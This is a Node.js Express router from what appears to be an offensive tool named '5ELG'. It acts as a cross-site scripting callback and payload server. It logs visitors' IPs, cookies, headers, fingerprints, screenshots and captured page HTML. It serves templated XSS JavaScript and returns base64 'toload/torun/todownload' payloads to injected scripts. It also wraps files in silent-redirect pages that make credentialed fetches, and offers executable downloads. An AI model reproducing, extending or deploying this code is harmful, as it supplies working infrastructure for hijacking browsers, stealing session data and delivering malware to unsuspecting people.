const express = require('express');
const router  = express.Router();
const { Log } = require('../Functions/db');
const { saveGeoForIP } = require('../Functions/scanners/ipinfo');
const fs  = require('fs').promises;
const fss = require('fs');
const path   = require('path');
const crypto = require('crypto');

/* ── ANSI colours ── */
const C = {
    Reset:'\x1b[0m', Bold:'\x1b[1m', Dim:'\x1b[2m',
    Red:'\x1b[31m',  Green:'\x1b[32m', Yellow:'\x1b[33m',
    Cyan:'\x1b[36m', Magenta:'\x1b[35m', White:'\x1b[37m',
};

/* ── Paths ── */
const SCREENSHOTS_DIR = path.join(__dirname, '../Sources/screenshotsB64');
const ASSETS_DIR      = path.join(__dirname, '../Web/assets/img');
const DEALERS_PATH    = path.join(__dirname, '../Sources/data/dealers.json');
const DEALERS_DIR     = path.join(__dirname, '../Dealers');
const DEFAULT_RESPONSE_CODE = Number(process.env.DEFAULT_RESPONSE) || 200;

if (!fss.existsSync(SCREENSHOTS_DIR)) fss.mkdirSync(SCREENSHOTS_DIR, { recursive: true });

/* ── helpers ── */
function isHash(v) {
    return typeof v === 'string' && /^[0-9a-f]{16,}$/i.test(v.trim());
}

function isImageRequest(urlPath) {
    const cleanPath = String(urlPath || '').split('?')[0].split('#')[0];
    return /\.(png|jpe?g|gif|webp|bmp|svg|ico|avif|tiff?|apng)$/i.test(cleanPath);
}

function sendPixel(res, status = 200) {
    res.setHeader('Content-Type', 'image/png');
    return res.status(status).sendFile(path.join(ASSETS_DIR, '1.png'));
}

function sendDefault(res, req, dealer) {
    const urlPath = req.originalUrl || req.url || '';
    const wantsPixel = isImageRequest(urlPath) || (dealer?.type || '').toUpperCase() === 'IMG-PING';
    if (wantsPixel) return sendPixel(res);
    return res.status(DEFAULT_RESPONSE_CODE).end();
}

/** Load dealers.json → always returns a plain array */
async function loadDealers() {
    try {
        if (!fss.existsSync(DEALERS_PATH)) return [];
        const parsed = JSON.parse(await fs.readFile(DEALERS_PATH, 'utf8'));
        return Array.isArray(parsed) ? parsed : (parsed.domains || []);
    } catch (e) {
        console.error(`${C.Yellow}[5ELG-WARN] loadDealers:${C.Reset}`, e.message);
        return [];
    }
}

/**
 * findDealerByUrl
 * Checks urlPath ONLY against dealer.aliases[] treated as paths.
 * urls[] is ignored for path detection — it holds the domain reference only.
 * Aliases that start with "/" are used as-is; others get a "/" prepended.
 */
function findDealerByUrl(dealers, urlPath) {
    const cleanPath = urlPath.split('?')[0];
    for (const d of dealers) {
        const aliases = Array.isArray(d.aliases) ? d.aliases : [];
        for (const a of aliases) {
            if (!a) continue;
            const ap = a.startsWith('/') ? a : '/' + a;
            if (cleanPath === ap || cleanPath.startsWith(ap + '/')) return d;
        }
    }
    return null;
}

/**
 * findDealerByName
 * Matches id, name, aliases (case-insensitive).
 */
function findDealerByName(dealers, name) {
    if (!name) return null;
    const lc = name.toLowerCase();
    return dealers.find(d =>
        (d.id   && d.id.toLowerCase()   === lc) ||
        (d.name && d.name.toLowerCase() === lc) ||
        (Array.isArray(d.aliases) && d.aliases.some(a => a.toLowerCase() === lc))
    ) || null;
}

/** Persist updated stats back to dealers.json (fire-and-forget) */
function bumpDealerStats(dealer) {
    dealer.time_request = dealer.time_request || {};
    dealer.time_request.last_time_request = new Date().toISOString();
    dealer.total_requests = (dealer.total_requests || 0) + 1;

    fs.readFile(DEALERS_PATH, 'utf8').then(raw => {
        const parsed  = JSON.parse(raw);
        const isArray = Array.isArray(parsed);
        const list    = isArray ? parsed : (parsed.domains || []);
        const idx     = list.findIndex(d => d.id === dealer.id);
        if (idx > -1) list[idx] = dealer;
        const out = isArray ? list : { ...parsed, domains: list };
        return fs.writeFile(DEALERS_PATH, JSON.stringify(out, null, 2), 'utf8');
    }).catch(e => console.warn(`${C.Yellow}[5ELG-WARN] bumpDealerStats:${C.Reset}`, e.message));
}

/* ──────────────────────────────────────────────────────────────
   MAIN HANDLER
────────────────────────────────────────────────────────────── */
router.all('*', async (req, res) => {
    try {
        /* 0. Skip internal app routes */
        const urlPath = req.originalUrl || req.url || '';
        if (
            urlPath.startsWith('/api')    ||
            urlPath.startsWith('/web')    ||
            urlPath.startsWith('/upload') ||
            urlPath === '/favicon.ico'
        ) return res.status(404).end();

        /* ── parse path key-value pairs (/DELR/paypal/u/abc…) ── */
        const cleanPath    = urlPath.split('?')[0];
        const pathSegments = cleanPath.split('/').filter(Boolean);
        const pathParams   = {};
        for (let i = 0; i < pathSegments.length; i += 2) {
            const key = pathSegments[i].toLowerCase();
            if (i + 1 < pathSegments.length) {
                try { pathParams[key] = decodeURIComponent(pathSegments[i + 1]); }
                catch (_) { pathParams[key] = pathSegments[i + 1]; }
            } else {
                pathParams[key] = 'true';
            }
        }

        const getParam     = k => req.body?.[k] || req.query?.[k] || pathParams[k.toLowerCase()] || '';
        const getAnyParam  = keys => { for (const k of keys) { const v = req.body?.[k] || req.body?.[k.toLowerCase()] || req.body?.[k.toUpperCase()] || req.query?.[k] || req.query?.[k.toLowerCase()] || req.query?.[k.toUpperCase()] || pathParams[k.toLowerCase()]; if (v) return v; } return ''; };
        const parseCookies = header => {
            if (!header || typeof header !== 'string') return {};
            return header.split(';').reduce((acc, pair) => {
                const [name, ...rest] = pair.split('=');
                if (!name) return acc;
                acc[name.trim()] = decodeURIComponent((rest || []).join('=').trim());
                return acc;
            }, {});
        };
        const cookieJar = req.cookies || parseCookies(req.headers?.cookie);
        const getAnyCookie = keys => { for (const k of keys) { const v = cookieJar?.[k] || cookieJar?.[k.toLowerCase()] || cookieJar?.[k.toUpperCase()]; if (v) return v; } return ''; };
        const getAnyHeader = keys => { for (const k of keys) { if (req.headers[k.toLowerCase()]) return req.headers[k.toLowerCase()]; } return ''; };

        /* ── 1. Resolve real IP ── */
        let ip = getAnyParam(['ip', 'IP'])
            || req.headers['cf-connecting-ip']
            || req.headers['true-client-ip']
            || req.headers['x-real-ip']
            || req.headers['x-client-ip']
            || req.headers['fastly-client-ip']
            || req.headers['incap-client-ip']
            || req.headers['x-cluster-client-ip']
            || '';
        if (!ip && req.headers['x-forwarded-for'])
            ip = req.headers['x-forwarded-for'].split(',')[0].trim();
        if (!ip)
            ip = req.socket?.remoteAddress || req.connection?.remoteAddress || '';
        if (ip.startsWith('::ffff:')) ip = ip.slice(7);

        /* ── 2. Load dealers & identify which one is hit ── */
        const dealers = await loadDealers();

        // Priority 2: explicit dealer name param / cookie / header / subdomain
        const dealerKeys = ['DEALER_NAME', 'D3ALER', 'DELR', 'dealer_name', 'camp', 'campaign', '5ELG-DEALER', 'X-DEALER'];
        const explicitDealerNameRaw = getAnyParam(dealerKeys) || getAnyCookie(dealerKeys) || getAnyHeader(dealerKeys);
        const explicitDealerName = explicitDealerNameRaw && !['true', '1.png', 'dealer.png'].includes(String(explicitDealerNameRaw).toLowerCase())
            ? explicitDealerNameRaw
            : '';

        let dealer = null;
        if (isImageRequest(urlPath) && explicitDealerName) {
            dealer = findDealerByName(dealers, explicitDealerName);
        }
        if (!dealer) {
            dealer = findDealerByUrl(dealers, urlPath);
        }

        if (!dealer) {
            let dealerName = explicitDealerName || '';

            if (!dealerName) {
                const host = req.hostname || req.headers.host || '';
                if (host) {
                    const parts  = host.split('.');
                    const lcKeys = dealerKeys.map(k => k.toLowerCase()); 
                    for (let i = 1; i < parts.length; i++) {
                        if (lcKeys.includes(parts[i].toLowerCase())) { dealerName = parts[i - 1]; break; }
                    }
                }
            }

            if (!dealerName || dealerName === 'true' || dealerName === '1.png' || dealerName === 'dealer.png')
                dealerName = '5ELG.DEALER';

            dealer = findDealerByName(dealers, dealerName);
        }

        /* ── 3. INACTIVE GATE ─────────────────────────────────────────
           Dealers with status !== "active" (empty string, "inactive", etc.)
           get a silent pixel response — no logging, no geo, no DB writes.
        ─────────────────────────────────────────────────────────── */
        if (dealer && dealer.status !== 'active') {
            console.log(`${C.Dim}[5ELG] Inactive dealer "${dealer.id}" — ignored${C.Reset}`);
            return sendDefault(res, req, dealer);
        }

        /* ── 4. GeoIP enrichment (async, non-blocking) ── */
        if (ip && ip !== '127.0.0.1' && ip !== '::1') {
            saveGeoForIP(ip).catch(e => console.error(`${C.Red}[5ELG-GEO-ERR]${C.Reset}`, e.message));
        }

        const userAgent = req.headers['user-agent'] || '';

        /* ── 5. Fingerprinting ── */
        const fpUserKeys = ['u', 'fu', 'fingeru', '5elg-u'];
        let fpUser = getAnyCookie(fpUserKeys);
        if (!isHash(fpUser)) fpUser = getAnyParam(fpUserKeys) || getAnyHeader(fpUserKeys) || '';

        const fpBrowserKeys = ['b', 'fb', 'fingerb', 'f', '5elg-b'];
        let fpBrowser = getAnyCookie(fpBrowserKeys);
        if (!isHash(fpBrowser)) fpBrowser = getAnyParam(fpBrowserKeys) || getAnyHeader(fpBrowserKeys) || '';

        const jsData      = getParam('data');
        const encodedPage = getParam('code');
        const encodedScr  = getParam('s');
        const rts         = getParam('ts') || new Date().toISOString();

        /* ── 6. Request ID (Fr) ── */
        let fpRequest = getParam('r');
        if (!fpRequest)
            fpRequest = crypto.createHash('sha256')
                .update(`${ip}-${userAgent}-${Date.now()}`)
                .digest('hex').slice(0, 16);

        /* ── 7. Build RequestData ── */
        let requestData;
        if (req.body?.encoded_req) {
            try { requestData = JSON.parse(req.body.encoded_req); }
            catch (_) { console.error(`${C.Red}[!] Error parsing encoded_req${C.Reset}`); }
        }
        if (!requestData) {
            const SKIP = new Set(['u', 'b', 'data', 'code', 's', 'ts', 'r', 'DEALER_NAME', 'encoded_req']);
            const queryParams = Object.keys(req.query).length ? req.query : undefined;
            const bodyParams  = req.body && typeof req.body === 'object'
                ? Object.fromEntries(Object.entries(req.body).filter(([k]) => !SKIP.has(k)))
                : undefined;
            requestData = {
                headers: req.headers, cookies: cookieJar || {},
                url: req.originalUrl, method: req.method,
                origin:  req.headers['origin']  || '',
                referer: req.headers['referer'] || '',
                ...(queryParams && Object.keys(queryParams).length && { params: queryParams }),
                ...(bodyParams  && Object.keys(bodyParams).length  && { body:   bodyParams }),
            };
        }
        requestData.detected_ip = ip;
        const encodedReqB64 = Buffer.from(JSON.stringify(requestData)).toString('base64');

        /* ── 8. Persist screenshot / code files ── */
        await Promise.all([
            encodedScr  && fs.writeFile(path.join(SCREENSHOTS_DIR, `${fpRequest}.shot`), encodedScr),
            encodedPage && fs.writeFile(path.join(SCREENSHOTS_DIR, `${fpRequest}.code`), encodedPage),
        ].filter(Boolean));

        /* ── 9. Log to DB ── */
        let dealerLogName = dealer?.id || dealer?.name || (explicitDealerName || 'HTTP.LOG');

        if (isImageRequest(urlPath) && !explicitDealerName) {
            dealerLogName = 'IMG-PING';
        }

        Log.create({
            Dl: dealerLogName, Ed: jsData, Er: encodedReqB64, Ts: rts,
            Ip: ip, Ua: userAgent, Fu: fpUser, Fb: fpBrowser, Fr: fpRequest,
            Jd: jsData,
            html:   encodedPage || null,
            screen: encodedScr  || null,
        }).catch(e => console.error(`${C.Red}[5ELG-DB-ERR]${C.Reset}`, e.message));

        console.log(`${C.Magenta}[5ELG]${C.Reset} Logged: ${C.Bold}${fpUser}${C.Reset} | IP: ${C.Cyan}${ip}${C.Reset} | Req: ${C.Dim}${fpRequest}${C.Reset}`);
        console.log(`  ${C.Dim}Dealer: ${C.Yellow}${dealerLogName}${C.Reset} | ${rts}`);

        /* ── 10. Bump dealer stats (fire-and-forget) ── */
        if (dealer) bumpDealerStats(dealer);

        /* ── 11. PROXY dealer → return dealer JSON as API ── */
        if (dealer?.isproxy === true) {
            return res.status(200).json(dealer);
        }

        /* ── 12. XSS / XSS-XL dealers — serve JS payload ───────────────
           XSS    → template: Dealers/templates/local/dl.js
                    patches: dealerUri = proto+domain+randomAlias
           XSS-XL → template: Dealers/templates/local/dl.full.js
                    patches: dealerUri = proto+domain+randomAlias
                             velghost  = domain (bare)
           Both: if dealer.file is set, serve that file instead of template.
        ─────────────────────────────────────────────────────────── */
        const hasRedirect = typeof dealer?.redirect === 'string' && dealer.redirect.startsWith('http');
        const hasFile     = Boolean(dealer?.file);
        const hasLoot     = dealer?.loot === '1' || dealer?.loot === 1;
        const wantsRedir  = hasLoot
            ? (req.method === 'POST' || req.query?.redir === 'true')
            : hasRedirect;

        const dealerType = (dealer?.type || '').toUpperCase();

        /* ── XSS-* / *-PROXY gate ───────────────────────────────────────
           Applies when type starts with "XSS-" OR ends with "-PROXY".
           Decision by method:
             POST + redirect + file → { goto, toload|torun|todownload }
             POST + redirect only   → { goto: "url" }
             POST + file only       → { toload|torun|todownload }
             POST + nothing         → 200 OK  (callback ack)
             GET  + file            → serve dealer.file as JS
             GET  + no file         → sendDefault
        ─────────────────────────────────────────────────────────── */

        /* build the POST JSON payload: goto + optional file field */
        function buildPostPayload() {
            const resp = {};
            if (hasRedirect) resp.goto = dealer.redirect;
            if (hasFile) {
                const fp = path.join(DEALERS_DIR, dealer.file);
                if (fss.existsSync(fp)) {
                    const ext = path.extname(dealer.file).toLowerCase();
                    const b64 = fss.readFileSync(fp).toString('base64');
                    if (ext === '.html' || ext === '.htm') resp.toload = b64;
                    else if (ext === '.js')               resp.torun  = b64;
                    else                                  resp.todownload = b64;
                }
            }
            return resp;
        }

        if (dealerType.startsWith('XSS-') || dealerType.endsWith('-PROXY')) {
            if (req.method === 'POST') {
                const payload = buildPostPayload();
                return Object.keys(payload).length
                    ? res.status(200).json(payload)
                    : res.status(200).end();
            }
            // GET → serve JS file
            if (hasFile) {
                const filePath = path.join(DEALERS_DIR, dealer.file);
                if (fss.existsSync(filePath)) {
                    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
                    return res.sendFile(filePath);
                }
                console.warn(`${C.Yellow}[5ELG-WARN] XSS/PROXY gate file not found: ${filePath}${C.Reset}`);
            }
            return sendDefault(res, req, dealer);
        }

        if (dealerType === 'XSS' || dealerType === 'XSS-XL' || dealerType === 'XSS-XXL' || dealerType === 'XSS-XXXL' || dealerType === 'XSS-FUCK') {
            // POST = callback from injected script — never serve JS back
            if (req.method === 'POST') {
                const payload = buildPostPayload();
                return Object.keys(payload).length
                    ? res.status(200).json(payload)
                    : res.status(200).end();
            }
            if (hasFile) {
                const xssPath = path.join(DEALERS_DIR, dealer.file);
                if (fss.existsSync(xssPath)) {
                    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
                    return res.sendFile(xssPath);
                }
                console.warn(`${C.Yellow}[5ELG-WARN] ${dealerType} file not found: ${xssPath}${C.Reset}`);
            }

            // Build shared URL parts
            const proto  = dealer.nossl === true ? 'http://' : 'https://';
            const domain = (Array.isArray(dealer.urls) && dealer.urls.length)
                ? dealer.urls[0].replace(/^https?:\/\//, '').replace(/\/$/, '')
                : req.hostname;
            const aliases   = Array.isArray(dealer.aliases) ? dealer.aliases : [];
            const pathPool  = aliases.filter(a => a.startsWith('/'));
            const namePool  = aliases.filter(a => !a.startsWith('/') && a.length > 1);
            const pool      = pathPool.length ? pathPool : namePool;
            const pick      = pool.length ? pool[Math.floor(Math.random() * pool.length)] : '/dealer';
            const aliasPath = pick.startsWith('/') ? pick : '/' + pick;
            const dealerUri = proto + domain + aliasPath;

            // Select template file
            const tplName = dealerType === 'XSS-XL' ? 'dl.full.js' : 'dl.js';
            const tplPath = path.join(__dirname, '../Dealers/templates/local', tplName);

            if (fss.existsSync(tplPath)) {
                try {
                    let js = await fs.readFile(tplPath, 'utf8');

                    js = js.replace(
                        /let dealerUri\s*=\s*["']555ELGCODETAG-1["']/,
                        `let dealerUri = "${dealerUri}"`
                    );

                    if (dealerType === 'XSS-XL') {
                        js = js.replace(
                            /let velghost\s*=\s*["']555ELGCODETAG-D["']/,
                            `let velghost = "${domain}"`
                        );
                    }

                    console.log(`${C.Cyan}[5ELG-${dealerType}]${C.Reset} Template served → ${C.Yellow}${dealerUri}${C.Reset} host=${C.Dim}${domain}${C.Reset}`);
                    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
                    return res.send(js);
                } catch (e) {
                    console.warn(`${C.Yellow}[5ELG-WARN] ${dealerType} template error:${C.Reset}`, e.message);
                }
            } else {
                console.warn(`${C.Yellow}[5ELG-WARN] Template not found: ${tplPath}${C.Reset}`);
            }

            return sendDefault(res, req, dealer);
        }

        /* ── 13. HTML dealer — serve file with injected dl.js script ───
           Loads dealer.file (HTML), reads templates/local/dl.js,
           replaces 555ELGCODETAG-1 with a random alias path (relative),
           injects the result as an inline <script> before </body>.
        ─────────────────────────────────────────────────────────── */
        if (dealerType === 'HTML') {
            const DEFAULT_HTML = path.join(__dirname, '../Dealers/exemples/dealer.html');
            const htmlPath = hasFile
                ? path.join(DEALERS_DIR, dealer.file)
                : DEFAULT_HTML;
            const tplPath  = path.join(__dirname, '../Dealers/templates/local/dl.js');

            if (!fss.existsSync(htmlPath)) {
                console.warn(`${C.Yellow}[5ELG-WARN] HTML file not found: ${htmlPath}${C.Reset}`);
                return sendDefault(res, req, dealer);
            }

            try {
                let html = await fs.readFile(htmlPath, 'utf8');

                // Build relative dealerUri from a random alias
                const aliases   = Array.isArray(dealer.aliases) ? dealer.aliases : [];
                const pathPool  = aliases.filter(a => a.startsWith('/'));
                const namePool  = aliases.filter(a => !a.startsWith('/') && a.length > 1);
                const pool      = pathPool.length ? pathPool : namePool;
                const pick      = pool.length ? pool[Math.floor(Math.random() * pool.length)] : '/dealer';
                const aliasPath = pick.startsWith('/') ? pick : '/' + pick;

                // Patch and inline the tracking script
                let scriptContent = '';
                if (fss.existsSync(tplPath)) {
                    scriptContent = await fs.readFile(tplPath, 'utf8');
                    scriptContent = scriptContent.replace(
                        /let dealerUri\s*=\s*["']555ELGCODETAG-1["']/,
                        `let dealerUri = "${aliasPath}"`
                    );
                }

                const scriptTag = scriptContent
                    ? `<script>\n${scriptContent}\n</script>`
                    : '';

                html = scriptTag
                    ? (/(<\/body>)/i.test(html)
                        ? html.replace(/(<\/body>)/i, scriptTag + '\n$1')
                        : html + '\n' + scriptTag)
                    : html;

                console.log(`${C.Cyan}[5ELG-HTML]${C.Reset} ${dealer.id} → ${C.Yellow}${aliasPath}${C.Reset}`);
                res.setHeader('Content-Type', 'text/html; charset=utf-8');
                return res.send(html);
            } catch (e) {
                console.warn(`${C.Yellow}[5ELG-WARN] HTML dealer error:${C.Reset}`, e.message);
                return sendDefault(res, req, dealer);
            }
        }

        /* ── 14. NON-PROXY dealer ─────────────────────────────────────
           Decision table:
           ┌────────────┬────────────────┬──────────────────────────────┐
           │ loot==="1" │ GET no redir   │ serve file                   │
           │ loot==="1" │ POST           │ redirect (with file wrapper) │
           │ loot==="1" │ GET ?redir=true│ redirect (with file wrapper) │
           │ (no loot)  │ has redirect   │ always redirect              │
           │ (no loot)  │ no redirect    │ serve file or pixel          │
           └────────────┴────────────────┴──────────────────────────────┘
        ─────────────────────────────────────────────────────────── */

        /* ── doRedirect: serve file+redirect wrapper or plain 302 ── */
        async function doRedirect() {
            res.setHeader('Location', dealer.redirect);

            if (hasFile) {
                const filePath = path.join(DEALERS_DIR, dealer.file);
                if (fss.existsSync(filePath)) {
                    const ext    = path.extname(dealer.file).toLowerCase();
                    const isHtml = ext === '.html' || ext === '.htm';
                    const isJs   = ext === '.js';

                    try {
                        if (isHtml) {
                            let html = await fs.readFile(filePath, 'utf8');
                            const injectScript = [
                                '<script>',
                                '(function(){',
                                '  setTimeout(function(){',
                                '    window.location.replace(' + JSON.stringify(dealer.redirect) + ');',
                                '  }, 50);',
                                '})();',
                                '</script>',
                                '<noscript><meta http-equiv="refresh" content="1;url=' + dealer.redirect + '"></noscript>',
                            ].join('\n');
                            html = /(<\/body>)/i.test(html)
                                ? html.replace(/(<\/body>)/i, injectScript + '\n$1')
                                : html + '\n' + injectScript;
                            res.setHeader('Content-Type', 'text/html; charset=utf-8');
                            return res.send(html);
                        } else {
                            const fileUrl  = '/' + path.basename(dealer.file);
                            const redirect = JSON.stringify(dealer.redirect);
                            const wrapHtml = [
                                '<!DOCTYPE html>',
                                '<html><head><meta charset="utf-8">',
                                isJs ? '<script src="' + fileUrl + '"></script>' : '',
                                '<script>',
                                '(function(){',
                                !isJs ? '  fetch("' + fileUrl + '",{credentials:"include"}).catch(function(){});' : '',
                                '  setTimeout(function(){ window.location.replace(' + redirect + '); }, 80);',
                                '})();',
                                '</script>',
                                '<noscript><meta http-equiv="refresh" content="1;url=' + dealer.redirect + '"></noscript>',
                                '</head><body></body></html>',
                            ].join('\n');
                            res.setHeader('Content-Type', 'text/html; charset=utf-8');
                            return res.send(wrapHtml);
                        }
                    } catch (e) {
                        console.warn(`${C.Yellow}[5ELG-WARN] doRedirect wrapper failed for ${dealer.file}:${C.Reset}`, e.message);
                    }
                } else {
                    console.warn(`${C.Yellow}[5ELG-WARN] File not found: ${path.join(DEALERS_DIR, dealer.file)}${C.Reset}`);
                }
            }

            // No file or file failed → plain 302
            return res.redirect(302, dealer.redirect);
        }

        /* ── doFile: serve the dealer file directly ── */
        function doFile() {
            const filePath = path.join(DEALERS_DIR, dealer.file);
            if (fss.existsSync(filePath)) return res.sendFile(filePath);
            console.warn(`${C.Yellow}[5ELG-WARN] File not found: ${filePath}${C.Reset}`);
            return false;
        }

        /* ── URL dealer ────────────────────────────────────────────────
           loot=1 :  GET          → serve file+script (or bare script html)
                     GET ?redir=1 → plain redirect
                     POST         → doRedirect with file wrapper
           loot=0/empty: GET  → serve file+script (or bare script html)
                          POST → 200 OK
        ─────────────────────────────────────────────────────────── */
        /* ── RAW dealer — serve file bytes as-is ───────────────────────
           No wrapping, no injection. Content-Type from file extension.
        ─────────────────────────────────────────────────────────── */
        if (dealerType === 'RAW' || dealerType === 'RAW-DOWNLOAD') {
            if (!hasFile) {
                console.warn(`${C.Yellow}[5ELG-${dealerType}] No file configured${C.Reset}`);
                return res.status(404).end();
            }
            const rawPath = path.join(DEALERS_DIR, dealer.file);
            if (!fss.existsSync(rawPath)) {
                console.warn(`${C.Yellow}[5ELG-${dealerType}] File not found: ${rawPath}${C.Reset}`);
                return res.status(404).end();
            }
            const extMap = {
                '.html':'text/html', '.htm':'text/html',
                '.php': 'application/x-httpd-php',
                '.js':  'application/javascript',
                '.json':'application/json',
                '.xml': 'application/xml',
                '.css': 'text/css',
                '.txt': 'text/plain',
                '.csv': 'text/csv',
                '.png': 'image/png',
                '.jpg': 'image/jpeg', '.jpeg':'image/jpeg',
                '.gif': 'image/gif',
                '.svg': 'image/svg+xml',
                '.ico': 'image/x-icon',
                '.pdf': 'application/pdf',
                '.zip': 'application/zip',
                '.exe': 'application/octet-stream',
                '.bin': 'application/octet-stream',
            };
            const ext  = path.extname(dealer.file).toLowerCase();
            const mime = extMap[ext] || 'application/octet-stream';
            console.log(`${C.Cyan}[5ELG-${dealerType}]${C.Reset} serving ${C.Yellow}${dealer.file}${C.Reset} as ${mime}`);
            res.setHeader('Content-Type', mime);
            if (dealerType === 'RAW-DOWNLOAD')
                res.setHeader('Content-Disposition', `attachment; filename="${path.basename(dealer.file)}"`);
            return res.sendFile(rawPath);
        }

        if (dealerType === 'URL') {
            // Build HTML page with tracking script injected
            async function buildUrlHtml() {
                const aliases   = Array.isArray(dealer.aliases) ? dealer.aliases : [];
                const pathPool  = aliases.filter(a => a.startsWith('/'));
                const namePool  = aliases.filter(a => !a.startsWith('/') && a.length > 1);
                const pool      = pathPool.length ? pathPool : namePool;
                const pick      = pool.length ? pool[Math.floor(Math.random() * pool.length)] : '/dealer';
                const aliasPath = pick.startsWith('/') ? pick : '/' + pick;

                const tplPath = path.join(__dirname, '../Dealers/templates/local/dl.js');
                let scriptTag = '';
                if (fss.existsSync(tplPath)) {
                    const tplJs = (await fs.readFile(tplPath, 'utf8')).replace(
                        /let dealerUri\s*=\s*["']555ELGCODETAG-1["']/,
                        `let dealerUri = "${aliasPath}"`
                    );
                    scriptTag = `<script>\n${tplJs}\n</script>`;
                }

                let html;
                if (hasFile) {
                    const htmlPath = path.join(DEALERS_DIR, dealer.file);
                    if (fss.existsSync(htmlPath)) {
                        html = await fs.readFile(htmlPath, 'utf8');
                        if (scriptTag) {
                            html = /(<\/body>)/i.test(html)
                                ? html.replace(/(<\/body>)/i, scriptTag + '\n$1')
                                : html + '\n' + scriptTag;
                        }
                        return { html, aliasPath };
                    }
                }
                // No file → minimal page with just the script
                html = `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>${scriptTag}</body></html>`;
                return { html, aliasPath };
            }

            if (hasLoot) {
                // GET + ?redir=true → plain redirect only
                if (req.method === 'GET' && req.query?.redir === 'true') {
                    if (hasRedirect) return res.redirect(302, dealer.redirect);
                    return sendDefault(res, req, dealer);
                }
                // GET → serve page with tracking script
                if (req.method === 'GET') {
                    const { html, aliasPath } = await buildUrlHtml();
                    console.log(`${C.Cyan}[5ELG-URL-LOOT]${C.Reset} GET → ${C.Yellow}${aliasPath}${C.Reset}`);
                    res.setHeader('Content-Type', 'text/html; charset=utf-8');
                    return res.send(html);
                }
                // POST → redirect with file wrapper
                if (hasRedirect) return await doRedirect();
                return res.status(200).end();
            } else {
                // loot=0/empty: GET → page+script, POST → 200
                if (req.method === 'GET') {
                    const { html, aliasPath } = await buildUrlHtml();
                    console.log(`${C.Cyan}[5ELG-URL]${C.Reset} GET → ${C.Yellow}${aliasPath}${C.Reset}`);
                    res.setHeader('Content-Type', 'text/html; charset=utf-8');
                    return res.send(html);
                }
                return res.status(200).end();
            }
        }

        /* ── Route (other non-proxy types) ── */
        if (hasLoot && hasFile) {
            if (wantsRedir && hasRedirect) return await doRedirect();
            if (doFile() === false) return sendDefault(res, req, dealer);
            return;
        }

        if (hasRedirect) return await doRedirect();
        if (hasFile)     { if (doFile() === false) return sendDefault(res, req, dealer); return; }

        /* ── 13. Fallback ── */
        return sendDefault(res, req, dealer);
    } catch (err) {
        console.error(`${C.Red}[5ELG-CRITICAL]${C.Reset}`, err.message);
        if (!res.headersSent) res.status(500).send('ERR');
    }
});

module.exports = router;